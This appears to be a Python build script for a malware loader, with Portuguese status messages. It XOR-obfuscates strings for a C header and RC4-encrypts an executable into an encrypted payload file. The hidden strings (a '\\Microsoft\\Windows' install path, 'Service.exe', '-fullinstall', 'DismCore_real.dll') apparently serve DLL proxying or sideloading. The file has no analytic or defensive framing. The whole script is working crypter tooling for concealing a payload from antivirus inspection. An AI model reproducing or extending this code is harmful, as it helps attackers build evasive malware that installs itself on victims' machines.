import os, random

STR_KEY = bytes(random.randint(1,255) for _ in range(16))
RC4_KEY = bytes(random.randint(1,255) for _ in range(16))

def obf_str(s):
    data = s.encode('utf-16-le')
    out = bytearray(len(data))
    for i in range(len(data)):
        if i % 2 == 0:
            out[i] = data[i] ^ STR_KEY[(i//2) % len(STR_KEY)]
        else:
            out[i] = data[i]
    return bytes(out)

def fmt(name, data):
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append("    " + ",".join(f"0x{b:02X}" for b in chunk) + ",")
    return f"static const unsigned char {name}[] = {{\n" + "\n".join(lines) + "\n};\n"

strings = {
    "S_PATH": "\\Microsoft\\Windows",
    "S_NAME": "Service.exe",
    "S_ARGS": "-fullinstall",
    "S_REAL": "DismCore_real.dll",
}

with open("OBF_STRINGS.h", "w") as f:
    f.write("#pragma once\n")
    f.write("static const unsigned char STR_KEY[] = {" +
            ",".join(f"0x{b:02X}" for b in STR_KEY) + "};\n")
    f.write(f"static const size_t STR_KEY_LEN = {len(STR_KEY)};\n\n")
    for name, s in strings.items():
        f.write(fmt(name, obf_str(s)))
        f.write("\n")

def rc4(data, key):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray(data)
    for n in range(len(out)):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[n] ^= s[(s[i] + s[j]) & 0xFF]
    return bytes(out)

with open("Service.exe", "rb") as f:
    payload = f.read()

with open("payload.bin", "wb") as f:
    f.write(rc4(payload, RC4_KEY))

print(f"[+] RC4_KEY = " + ",".join(f"0x{b:02X}" for b in RC4_KEY))
print(f"[+] OBF_STRINGS.h gerado")
print(f"[+] payload.bin regravado ({len(payload)} bytes)")